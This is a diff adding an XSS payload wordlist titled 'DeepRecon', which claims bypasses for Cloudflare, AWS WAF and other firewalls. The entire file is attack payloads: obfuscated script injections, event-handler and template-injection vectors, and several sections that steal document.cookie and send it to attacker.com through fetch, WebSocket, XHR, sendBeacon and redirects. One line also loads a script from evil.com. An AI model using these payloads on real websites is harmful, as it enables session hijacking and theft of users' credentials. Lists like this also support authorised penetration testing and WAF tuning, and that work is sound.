@@ -1,0 +1,1031 @@
+# DeepRecon - Advanced XSS WAF Bypass Payloads
+# Compiled from: Latest WAF bypass research, Bug Bounty findings, Polyglot techniques
+# Author: r0tbin
+# Sources: CloudFlare, AWS WAF, ModSecurity, Imperva, Akamai bypasses
+# Updated: 2025 - Latest techniques and obfuscation methods
+
+# ========================================
+# BASIC XSS PAYLOADS
+# ========================================
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+
+# ========================================
+# CLOUDFLARE WAF BYPASSES
+# ========================================
+<Img/Src/OnError=(alert)(1)>
+"><svg+onx+%00+onload%3Dalert(document.domain)+x>
+"><sVg/onload=window["al"+"ert"]`1337`>
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+<svg/onload='fetch(`//attacker.com?cookie=`+document.cookie)'>
+<svg onload=String.fromCharCode(97,108,101,114,116)(1)>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg onload=alert?.(1)>
+<svg onload=('a'+'lert')(1)>
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<details/open/id="&quot;"ontoggle=alert(1)>
+<details open id="'&quot;'" ontoggle=alert(1)>
+<x x="&quot;"onerror=alert(1)>
+<x x="&#x22;"onerror=alert(1)>
+<x x="&#34;"onerror=alert(1)>
+<x x="&#00000000034;"onerror=alert(1)>
+
+# ========================================
+# AWS WAF BYPASSES
+# ========================================
+<svg><image href="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<math><mtext><script>alert(1)</script></mtext></math>
+<svg><g/onload=alert(1)></g></svg>
+<div onmouseenter=alert(1)>
+<input type="text" autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">Click</a>
+<form><button formaction=javascript:alert(1)>Click</button></form>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<marquee onstart=alert(1)>
+<video poster=javascript:alert(1)>
+<body background="javascript:alert(1)">
+
+# ========================================
+# UNICODE & ENCODING BYPASSES
+# ========================================
+<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>
+<svg onload=\x61\x6c\x65\x72\x74\x28\x31\x29>
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
+<svg onload=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<img src=x onerror=%61%6c%65%72%74%28%31%29>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
+<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</script>
+
+# ========================================
+# POLYGLOT PAYLOADS
+# ========================================
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+"><sVg/onload='fetch(`//attacker.com?cookie=`+document.cookie)><!--
+"><svg onload=alert(1) style="background:url(javascript:alert(1))"><!--
+</textarea><svg onload=alert(1)>
+</style><script>alert(1)</script><style>
+*/alert(1)/*
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<!--<script>/*--><svg onload=alert(1)/*</script>-->
+&lt;script&gt;alert(1)&lt;/script&gt;
+<svg><image href="javascript:alert(1)"></svg>
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+</textarea></script></iframe><svg onload=alert(1)>
+
+# ========================================
+# HTML ENTITY ENCODING BYPASSES
+# ========================================
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;
+&lt;svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;
+&#60;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#x3C;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#x3E;
+&lt;script&gt;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&lt;/script&gt;
+&lt;img src=x onerror=&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;
+&lt;svg onload=&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;
+
+# ========================================
+# NULL BYTE & SPECIAL CHARACTER BYPASSES
+# ========================================
+<svg%00 onload=alert(1)>
+<img%00 src=x onerror=alert(1)>
+<script%00>alert(1)</script>
+<svg onload%00=alert(1)>
+<img src=x%00 onerror=alert(1)>
+<svg onload=alert%00(1)>
+<img src=x onerror=alert%00(1)>
+<svg onload=ale%00rt(1)>
+<img src=x onerror=ale%00rt(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<script/src=//evil.com></script>
+<svg//onload=alert(1)>
+<img//src=x//onerror=alert(1)>
+<svg onload=alert(1)//>
+<img src=x onerror=alert(1)//>
+
+# ========================================
+# COMMENT INJECTION BYPASSES
+# ========================================
+<svg onload=al/**/ert(1)>
+<img src=x onerror=al/**/ert(1)>
+<script>al/**/ert(1)</script>
+<svg onload=a/**/l/**/e/**/r/**/t(1)>
+<img src=x onerror=a/**/l/**/e/**/r/**/t(1)>
+<svg onload=alert/*comment*/(1)>
+<img src=x onerror=alert/*comment*/(1)>
+<svg onload=/*comment*/alert(1)>
+<img src=x onerror=/*comment*/alert(1)>
+<svg onload=alert(1)/*comment*/>
+<img src=x onerror=alert(1)/*comment*/>
+<script>/*comment*/alert(1)/*comment*/</script>
+<svg onload=al<!---->ert(1)>
+<img src=x onerror=al<!---->ert(1)>
+
+# ========================================
+# CASE VARIATION BYPASSES
+# ========================================
+<ScRiPt>AlErT(1)</ScRiPt>
+<ImG sRc=X oNeRrOr=AlErT(1)>
+<SvG oNlOaD=AlErT(1)>
+<SCRIPT>ALERT(1)</SCRIPT>
+<IMG SRC=X ONERROR=ALERT(1)>
+<SVG ONLOAD=ALERT(1)>
+<script>ALERT(1)</script>
+<img src=x ONERROR=alert(1)>
+<svg ONLOAD=alert(1)>
+<ScRiPt>aLeRt(1)</ScRiPt>
+<ImG sRc=x OnErRoR=aLeRt(1)>
+<SvG oNlOaD=aLeRt(1)>
+
+# ========================================
+# WHITESPACE & TAB BYPASSES
+# ========================================
+<script	>alert(1)</script>
+<img	src=x	onerror=alert(1)>
+<svg	onload=alert(1)>
+<script
+>alert(1)</script>
+<img
+src=x
+onerror=alert(1)>
+<svg
+onload=alert(1)>
+<script>alert	(1)</script>
+<img src=x onerror=alert	(1)>
+<svg onload=alert	(1)>
+<script>	alert(1)	</script>
+<img src=x onerror=	alert(1)	>
+<svg onload=	alert(1)	>
+<script>alert
+(1)</script>
+<img src=x onerror=alert
+(1)>
+<svg onload=alert
+(1)>
+
+# ========================================
+# JAVASCRIPT PROTOCOL BYPASSES
+# ========================================
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit>
+<input type=image src=x onclick="javascript:alert(1)">
+<body background="javascript:alert(1)">
+<table background="javascript:alert(1)">
+<td background="javascript:alert(1)">
+<div style="background-image:url(javascript:alert(1))">
+<link rel="stylesheet" href="javascript:alert(1)">
+<style>@import"javascript:alert(1)";</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<marquee onstart="javascript:alert(1)">
+<video poster="javascript:alert(1)">
+
+# ========================================
+# DATA URI BYPASSES
+# ========================================
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html;charset=utf-8,<script>alert(1)</script>">
+<object data="data:text/html;charset=utf-8,<script>alert(1)</script>">
+<iframe src="data:image/svg+xml,<svg onload=alert(1)>">
+<object data="data:image/svg+xml,<svg onload=alert(1)>">
+<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">
+<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+
+# ========================================
+# ATTRIBUTE INJECTION BYPASSES
+# ========================================
+<input type="text" value="" onfocus="alert(1)" autofocus="">
+<select onfocus="alert(1)" autofocus=""><option>test</option></select>
+<textarea onfocus="alert(1)" autofocus="">test</textarea>
+<keygen onfocus="alert(1)" autofocus="">
+<input type="hidden" onchange="alert(1)" value="1">
+<input type="search" onsearch="alert(1)" value="search">
+<input type="button" onclick="alert(1)" value="Click">
+<input type="submit" onclick="alert(1)" value="Submit">
+<input type="reset" onclick="alert(1)" value="Reset">
+<input type="image" src="x" onclick="alert(1)">
+<input type="file" onchange="alert(1)">
+<input type="checkbox" onclick="alert(1)">
+<input type="radio" onclick="alert(1)">
+
+# ========================================
+# EVENT HANDLER BYPASSES
+# ========================================
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onmessage=alert(1)>
+<body onoffline=alert(1)>
+<body ononline=alert(1)>
+<body onpagehide=alert(1)>
+<body onpopstate=alert(1)>
+<body onresize=alert(1)>
+<body onstorage=alert(1)>
+<body onunload=alert(1)>
+<body onbeforeunload=alert(1)>
+<img src=x onabort=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onload=alert(1)>
+<video oncanplay=alert(1)>
+<video oncanplaythrough=alert(1)>
+<video ondurationchange=alert(1)>
+<video onemptied=alert(1)>
+<video onended=alert(1)>
+<video onerror=alert(1)>
+<video onloadeddata=alert(1)>
+<video onloadedmetadata=alert(1)>
+<video onloadstart=alert(1)>
+<video onpause=alert(1)>
+<video onplay=alert(1)>
+<video onplaying=alert(1)>
+<video onprogress=alert(1)>
+<video onratechange=alert(1)>
+<video onseeked=alert(1)>
+<video onseeking=alert(1)>
+<video onstalled=alert(1)>
+<video onsuspend=alert(1)>
+<video ontimeupdate=alert(1)>
+<video onvolumechange=alert(1)>
+<video onwaiting=alert(1)>
+
+# ========================================
+# FORM & INPUT BYPASSES
+# ========================================
+<form><input type=submit formaction=javascript:alert(1) value=Submit>
+<form><input type=image formaction=javascript:alert(1) src=x>
+<form><button formaction=javascript:alert(1)>Click</button>
+<form action=javascript:alert(1)><input type=submit value=Submit>
+<input type=image src=x onclick=alert(1)>
+<input type=button onclick=alert(1) value=Click>
+<input type=submit onclick=alert(1) value=Submit>
+<input type=reset onclick=alert(1) value=Reset>
+<input type=file onchange=alert(1)>
+<input type=text onfocus=alert(1) autofocus>
+<input type=search onsearch=alert(1)>
+<input type=tel oninput=alert(1)>
+<input type=url oninput=alert(1)>
+<input type=email oninput=alert(1)>
+<input type=password oninput=alert(1)>
+<input type=datetime oninput=alert(1)>
+<input type=date oninput=alert(1)>
+<input type=month oninput=alert(1)>
+<input type=week oninput=alert(1)>
+<input type=time oninput=alert(1)>
+<input type=datetime-local oninput=alert(1)>
+<input type=number oninput=alert(1)>
+<input type=range oninput=alert(1)>
+<input type=color onchange=alert(1)>
+
+# ========================================
+# CSS INJECTION BYPASSES
+# ========================================
+<style>body{background-image:url(javascript:alert(1))}</style>
+<div style="background-image:url(javascript:alert(1))">
+<div style="background:url(javascript:alert(1))">
+<style>@import"javascript:alert(1)";</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+<style>div{background-image:url("javascript:alert(1)")}</style>
+<div style="background-image:url('javascript:alert(1)')">
+<style>body{background:url(data:text/html,<script>alert(1)</script>)}</style>
+<div style="background:url(data:text/html,<script>alert(1)</script>)">
+<style>body{background-image:url(data:image/svg+xml,<svg onload=alert(1)>)}</style>
+<div style="background-image:url(data:image/svg+xml,<svg onload=alert(1)>)">
+<style>body{background:expression(alert(1))}</style>
+<div style="background:expression(alert(1))">
+<style>body{behavior:url(javascript:alert(1))}</style>
+<div style="behavior:url(javascript:alert(1))">
+
+# ========================================
+# TEMPLATE INJECTION BYPASSES
+# ========================================
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('alert(document.domain)')()}}
+{{constructor.constructor('alert(document.cookie)')()}}
+{{''.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{a='constructor';b={};a.sub.call(b={};a.sub.call(b,{});a='alert(1)';a.fontcolor&&a.fontcolor(b);}}
+<script>{{constructor.constructor('alert(1)')()}}</script>
+<img src=x onerror="{{constructor.constructor('alert(1)')()}}">
+<svg onload="{{constructor.constructor('alert(1)')()}}">
+{{7*7}}
+{{7*'7'}}
+${7*7}
+${alert(1)}
+#{7*7}
+#{alert(1)}
+<%= 7*7 %>
+<%= alert(1) %>
+
+# ========================================
+# MARKDOWN INJECTION BYPASSES
+# ========================================
+[XSS](javascript:alert(1))
+[XSS](data:text/html,<script>alert(1)</script>)
+![XSS](javascript:alert(1))
+![XSS](data:text/html,<script>alert(1)</script>)
+[XSS](javascript:prompt(document.domain))
+![XSS](javascript:prompt(document.domain))
+<javascript:alert(1)>
+<data:text/html,<script>alert(1)</script>>
+
+# ========================================
+# BYPASS WITH MIXED QUOTES
+# ========================================
+<img src='x' onerror="alert(1)">
+<img src="x" onerror='alert(1)'>
+<svg onload='alert(1)'>
+<svg onload="alert(1)">
+<script>alert('1')</script>
+<script>alert("1")</script>
+<img src=x onerror='alert("1")'>
+<img src=x onerror="alert('1')">
+<svg onload='alert("XSS")'>
+<svg onload="alert('XSS')">
+<img src='x' onerror='alert(1)'>
+<img src="x" onerror="alert(1)">
+
+# ========================================
+# BYPASS WITH ALTERNATIVE FUNCTIONS
+# ========================================
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+<script>console.error(1)</script>
+<script>console.warn(1)</script>
+<script>console.info(1)</script>
+<script>console.debug(1)</script>
+<script>console.trace(1)</script>
+<script>print(1)</script>
+<script>setTimeout('alert(1)',1)</script>
+<script>setInterval('alert(1)',1)</script>
+<script>Function('alert(1)')()</script>
+<script>eval('alert(1)')</script>
+<script>execScript('alert(1)')</script>
+<script>msWriteProfilerMark('alert(1)')</script>
+<script>window['alert'](1)</script>
+<script>window.alert(1)</script>
+<script>self.alert(1)</script>
+<script>top.alert(1)</script>
+<script>parent.alert(1)</script>
+<script>frames.alert(1)</script>
+
+# ========================================
+# BYPASS WITH STRING CONCATENATION
+# ========================================
+<script>alert('a'+'b')</script>
+<script>alert(1+'1')</script>
+<script>alert('1'+1)</script>
+<script>('ale'+'rt')(1)</script>
+<script>('al'+'ert')(1)</script>
+<script>window['al'+'ert'](1)</script>
+<script>window['ale'+'rt'](1)</script>
+<img src=x onerror="('ale'+'rt')(1)">
+<svg onload="('ale'+'rt')(1)">
+<img src=x onerror="window['al'+'ert'](1)">
+<svg onload="window['al'+'ert'](1)">
+<script>eval('al'+'ert(1)')</script>
+<script>Function('al'+'ert(1)')()</script>
+<script>setTimeout('al'+'ert(1)',1)</script>
+
+# ========================================
+# BYPASS WITH FROMCHARCODE
+# ========================================
+<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>
+<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<img src=x onerror="Function(String.fromCharCode(97,108,101,114,116,40,49,41))()">
+<svg onload="Function(String.fromCharCode(97,108,101,114,116,40,49,41))()">
+<script>String['fromCharCode'](97,108,101,114,116,40,49,41)</script>
+<script>eval(String['fromCharCode'](97,108,101,114,116,40,49,41))</script>
+
+# ========================================
+# BYPASS WITH ATOB (BASE64)
+# ========================================
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function(atob('YWxlcnQoMSk='))()</script>
+<script>setTimeout(atob('YWxlcnQoMSk='),1)</script>
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+<img src=x onerror="Function(atob('YWxlcnQoMSk='))()">
+<svg onload="Function(atob('YWxlcnQoMSk='))()">
+<script>window['eval'](atob('YWxlcnQoMSk='))</script>
+<script>self['eval'](atob('YWxlcnQoMSk='))</script>
+<script>top['eval'](atob('YWxlcnQoMSk='))</script>
+
+# ========================================
+# BYPASS WITH UNESCAPE
+# ========================================
+<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>
+<script>Function(unescape('%61%6c%65%72%74%28%31%29'))()</script>
+<script>setTimeout(unescape('%61%6c%65%72%74%28%31%29'),1)</script>
+<img src=x onerror="eval(unescape('%61%6c%65%72%74%28%31%29'))">
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%29'))">
+<img src=x onerror="Function(unescape('%61%6c%65%72%74%28%31%29'))()">
+<svg onload="Function(unescape('%61%6c%65%72%74%28%31%29'))()">
+<script>window['eval'](unescape('%61%6c%65%72%74%28%31%29'))</script>
+<script>self['eval'](unescape('%61%6c%65%72%74%28%31%29'))</script>
+
+# ========================================
+# BYPASS WITH ESCAPE SEQUENCES
+# ========================================
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
+<script>\x61\x6c\x65\x72\x74(1)</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<svg onload="\u0061\u006c\u0065\u0072\u0074(1)">
+<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
+<svg onload="\x61\x6c\x65\x72\x74(1)">
+<script>\141\154\145\162\164(1)</script>
+<script>eval('\141\154\145\162\164\50\61\51')</script>
+
+# ========================================
+# BYPASS WITH REGEX
+# ========================================
+<script>/alert/.source.constructor('return alert(1)')()</script>
+<script>/./.constructor('alert(1)')()</script>
+<script>/.*/.constructor('alert(1)')()</script>
+<img src=x onerror="/alert/.source.constructor('return alert(1)')()">
+<svg onload="/alert/.source.constructor('return alert(1)')()">
+<img src=x onerror="/./.constructor('alert(1)')()">
+<svg onload="/./.constructor('alert(1)')()">
+<script>RegExp.prototype.constructor('alert(1)')()</script>
+<script>RegExp('').constructor('alert(1)')()</script>
+
+# ========================================
+# BYPASS WITH ARRAY METHODS
+# ========================================
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>[]['constructor']['constructor']('alert(1)')()</script>
+<script>Array.prototype.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="[].constructor.constructor('alert(1)')()">
+<svg onload="[].constructor.constructor('alert(1)')()">
+<img src=x onerror="[]['constructor']['constructor']('alert(1)')()">
+<svg onload="[]['constructor']['constructor']('alert(1)')()">
+<script>[].sort.constructor('alert(1)')()</script>
+<script>[].join.constructor('alert(1)')()</script>
+
+# ========================================
+# BYPASS WITH OBJECT METHODS
+# ========================================
+<script>{}.constructor.constructor('alert(1)')()</script>
+<script>Object.prototype.constructor.constructor('alert(1)')()</script>
+<script>Object.constructor.constructor('alert(1)')()</script>
+<img src=x onerror="{}.constructor.constructor('alert(1)')()">
+<svg onload="{}.constructor.constructor('alert(1)')()">
+<img src=x onerror="Object.constructor.constructor('alert(1)')()">
+<svg onload="Object.constructor.constructor('alert(1)')()">
+<script>Object.create.constructor('alert(1)')()</script>
+<script>Object.keys.constructor('alert(1)')()</script>
+
+# ========================================
+# BYPASS WITH FETCH & EXFILTRATION
+# ========================================
+<script>fetch('//attacker.com/'+document.cookie)</script>
+<script>fetch('//attacker.com/?cookie='+document.cookie)</script>
+<script>fetch('//attacker.com/?data='+btoa(document.cookie))</script>
+<img src=x onerror="fetch('//attacker.com/'+document.cookie)">
+<svg onload="fetch('//attacker.com/'+document.cookie)">
+<img src=x onerror="fetch('//attacker.com/?cookie='+document.cookie)">
+<svg onload="fetch('//attacker.com/?cookie='+document.cookie)">
+<script>navigator.sendBeacon('//attacker.com',document.cookie)</script>
+<script>new Image().src='//attacker.com/'+document.cookie</script>
+<img src=x onerror="new Image().src='//attacker.com/'+document.cookie">
+<svg onload="new Image().src='//attacker.com/'+document.cookie">
+
+# ========================================
+# BYPASS WITH WEBSOCKET
+# ========================================
+<script>new WebSocket('ws://attacker.com').send(document.cookie)</script>
+<script>ws=new WebSocket('ws://attacker.com');ws.onopen=()=>ws.send(document.cookie)</script>
+<img src=x onerror="new WebSocket('ws://attacker.com').send(document.cookie)">
+<svg onload="new WebSocket('ws://attacker.com').send(document.cookie)">
+<script>new WebSocket('wss://attacker.com').send(document.cookie)</script>
+<script>ws=new WebSocket('wss://attacker.com');ws.onopen=()=>ws.send(document.cookie)</script>
+
+# ========================================
+# BYPASS WITH XMLHTTPREQUEST
+# ========================================
+<script>x=new XMLHttpRequest();x.open('GET','//attacker.com/'+document.cookie);x.send()</script>
+<script>x=new XMLHttpRequest();x.open('POST','//attacker.com');x.send(document.cookie)</script>
+<img src=x onerror="x=new XMLHttpRequest();x.open('GET','//attacker.com/'+document.cookie);x.send()">
+<svg onload="x=new XMLHttpRequest();x.open('GET','//attacker.com/'+document.cookie);x.send()">
+<script>$.get('//attacker.com/'+document.cookie)</script>
+<script>$.post('//attacker.com',{cookie:document.cookie})</script>
+
+# ========================================
+# BYPASS WITH POSTMESSAGE
+# ========================================
+<script>parent.postMessage(document.cookie,'*')</script>
+<script>top.postMessage(document.cookie,'*')</script>
+<script>window.parent.postMessage(document.cookie,'*')</script>
+<img src=x onerror="parent.postMessage(document.cookie,'*')">
+<svg onload="parent.postMessage(document.cookie,'*')">
+<img src=x onerror="top.postMessage(document.cookie,'*')">
+<svg onload="top.postMessage(document.cookie,'*')">
+<script>frames[0].postMessage(document.cookie,'*')</script>
+<script>opener.postMessage(document.cookie,'*')</script>
+
+# ========================================
+# BYPASS WITH LOCATION
+# ========================================
+<script>location='//attacker.com/'+document.cookie</script>
+<script>location.href='//attacker.com/'+document.cookie</script>
+<script>location.assign('//attacker.com/'+document.cookie)</script>
+<script>location.replace('//attacker.com/'+document.cookie)</script>
+<img src=x onerror="location='//attacker.com/'+document.cookie">
+<svg onload="location='//attacker.com/'+document.cookie">
+<img src=x onerror="location.href='//attacker.com/'+document.cookie">
+<svg onload="location.href='//attacker.com/'+document.cookie">
+<script>window.location='//attacker.com/'+document.cookie</script>
+<script>top.location='//attacker.com/'+document.cookie</script>
+
+# ========================================
+# BYPASS WITH DOCUMENT.WRITE
+# ========================================
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.write('<script>alert(1)<\/script>')</script>
+<img src=x onerror="document.write('<img src=x onerror=alert(1)>')">
+<svg onload="document.write('<svg onload=alert(1)>')">
+<script>document.writeln('<img src=x onerror=alert(1)>')</script>
+<script>document.writeln('<svg onload=alert(1)>')</script>
+
+# ========================================
+# BYPASS WITH INNERHTML
+# ========================================
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>document.body.innerHTML='<svg onload=alert(1)>'</script>
+<script>document.documentElement.innerHTML='<img src=x onerror=alert(1)>'</script>
+<img src=x onerror="document.body.innerHTML='<img src=x onerror=alert(1)>'">
+<svg onload="document.body.innerHTML='<svg onload=alert(1)>'">
+<script>document.head.innerHTML='<script>alert(1)<\/script>'</script>
+<script>document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# ========================================
+# BYPASS WITH OUTERHTML
+# ========================================
+<script>document.body.outerHTML='<body><img src=x onerror=alert(1)></body>'</script>
+<script>document.documentElement.outerHTML='<html><img src=x onerror=alert(1)></html>'</script>
+<img src=x onerror="document.body.outerHTML='<body><img src=x onerror=alert(1)></body>'">
+<svg onload="document.body.outerHTML='<body><svg onload=alert(1)></body>'">
+
+# ========================================
+# BYPASS WITH INSERTADJACENTHTML
+# ========================================
+<script>document.body.insertAdjacentHTML('afterbegin','<img src=x onerror=alert(1)>')</script>
+<script>document.body.insertAdjacentHTML('beforeend','<svg onload=alert(1)>')</script>
+<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<img src=x onerror=alert(1)>')">
+<svg onload="document.body.insertAdjacentHTML('beforeend','<svg onload=alert(1)>')">
+<script>document.head.insertAdjacentHTML('afterbegin','<script>alert(1)<\/script>')</script>
+
+# ========================================
+# BYPASS WITH CREATEELEMENT
+# ========================================
+<script>x=document.createElement('img');x.src='x';x.onerror=alert;x.onerror(1);document.body.appendChild(x)</script>
+<script>x=document.createElement('script');x.innerHTML='alert(1)';document.head.appendChild(x)</script>
+<img src=x onerror="x=document.createElement('img');x.src='x';x.onerror=alert;x.onerror(1)">
+<svg onload="x=document.createElement('script');x.innerHTML='alert(1)';document.head.appendChild(x)">
+<script>x=document.createElement('iframe');x.src='javascript:alert(1)';document.body.appendChild(x)</script>
+
+# ========================================
+# BYPASS WITH SETTIMEOUT/SETINTERVAL
+# ========================================
+<script>setTimeout(alert,1,1)</script>
+<script>setTimeout('alert(1)',1)</script>
+<script>setTimeout(function(){alert(1)},1)</script>
+<script>setInterval(alert,1000,1)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>setInterval(function(){alert(1)},1000)</script>
+<img src=x onerror="setTimeout(alert,1,1)">
+<svg onload="setTimeout(alert,1,1)">
+<img src=x onerror="setTimeout('alert(1)',1)">
+<svg onload="setTimeout('alert(1)',1)">
+
+# ========================================
+# BYPASS WITH REQUESTANIMATIONFRAME
+# ========================================
+<script>requestAnimationFrame(function(){alert(1)})</script>
+<script>requestAnimationFrame(alert.bind(null,1))</script>
+<img src=x onerror="requestAnimationFrame(function(){alert(1)})">
+<svg onload="requestAnimationFrame(function(){alert(1)})">
+<img src=x onerror="requestAnimationFrame(alert.bind(null,1))">
+<svg onload="requestAnimationFrame(alert.bind(null,1))">
+
+# ========================================
+# BYPASS WITH PROMISE
+# ========================================
+<script>Promise.resolve().then(function(){alert(1)})</script>
+<script>Promise.resolve().then(alert.bind(null,1))</script>
+<script>new Promise(function(resolve){alert(1);resolve()})</script>
+<img src=x onerror="Promise.resolve().then(function(){alert(1)})">
+<svg onload="Promise.resolve().then(function(){alert(1)})">
+<img src=x onerror="Promise.resolve().then(alert.bind(null,1))">
+<svg onload="Promise.resolve().then(alert.bind(null,1))">
+
+# ========================================
+# BYPASS WITH ASYNC/AWAIT
+# ========================================
+<script>async function x(){alert(1)}x()</script>
+<script>(async()=>{alert(1)})()</script>
+<script>async function x(){await alert(1)}x()</script>
+<img src=x onerror="(async()=>{alert(1)})()">
+<svg onload="(async()=>{alert(1)})()">
+
+# ========================================
+# BYPASS WITH GENERATOR
+# ========================================
+<script>function* x(){yield alert(1)}x().next()</script>
+<script>(function*(){yield alert(1)})().next()</script>
+<img src=x onerror="(function*(){yield alert(1)})().next()">
+<svg onload="(function*(){yield alert(1)})().next()">
+
+# ========================================
+# BYPASS WITH PROXY
+# ========================================
+<script>new Proxy({},{get:function(){alert(1)}}).x</script>
+<script>new Proxy(function(){},{apply:function(){alert(1)}})()</script>
+<img src=x onerror="new Proxy({},{get:function(){alert(1)}}).x">
+<svg onload="new Proxy({},{get:function(){alert(1)}}).x">
+
+# ========================================
+# BYPASS WITH SYMBOL
+# ========================================
+<script>Symbol.for('alert')(1)</script>
+<script>Symbol.iterator.constructor('alert(1)')()</script>
+<img src=x onerror="Symbol.iterator.constructor('alert(1)')()">
+<svg onload="Symbol.iterator.constructor('alert(1)')()">
+
+# ========================================
+# BYPASS WITH REFLECT
+# ========================================
+<script>Reflect.apply(alert,null,[1])</script>
+<script>Reflect.construct(Function,['alert(1)'])()</script>
+<img src=x onerror="Reflect.apply(alert,null,[1])">
+<svg onload="Reflect.apply(alert,null,[1])">
+<img src=x onerror="Reflect.construct(Function,['alert(1)'])()">
+<svg onload="Reflect.construct(Function,['alert(1)'])()">
+
+# ========================================
+# BYPASS WITH WEAKMAP/WEAKSET
+# ========================================
+<script>new WeakMap().constructor.constructor('alert(1)')()</script>
